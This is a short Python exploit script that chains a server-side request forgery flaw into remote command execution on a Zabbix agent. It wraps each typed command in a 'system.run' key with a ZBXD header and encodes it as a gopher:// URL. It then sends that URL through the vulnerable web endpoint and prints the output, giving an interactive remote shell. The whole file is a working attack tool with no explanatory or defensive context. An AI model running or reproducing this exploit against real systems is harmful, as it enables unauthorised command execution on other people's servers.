import urllib.parse
import struct
import requests
import sys

header = 'ZBXD\x01'
if len(sys.argv) < 3 :
    print('Usage: python3 exploit.py <url> <zabix_ip> <zabix_port>')
    exit(-1)
url = sys.argv[1]
zabix_ip = sys.argv[2]
zabix_port = sys.argv[3]
while True:

    cmd = input('$ ')
    if cmd == 'q' or cmd == 'quit' or cmd == 'exit':
        break
    key = f'system.run[({cmd})]'
    line= 'gopher://'+zabix_ip+':'+zabix_port+'/_'+ urllib.parse.quote_plus(urllib.parse.quote_plus(header + struct.pack('<Q',len(key)+2).decode('UTF-8') + key).replace('+','%20').replace('%2F','/').replace('%25','%').replace('%3A',':'))
    s = requests.get(url+line)
    if 'ZBXD' in s.text:
        print(s.text.split('ZBXD')[1])
    else:
        print('error: Not ssrf ZABBIX')
        break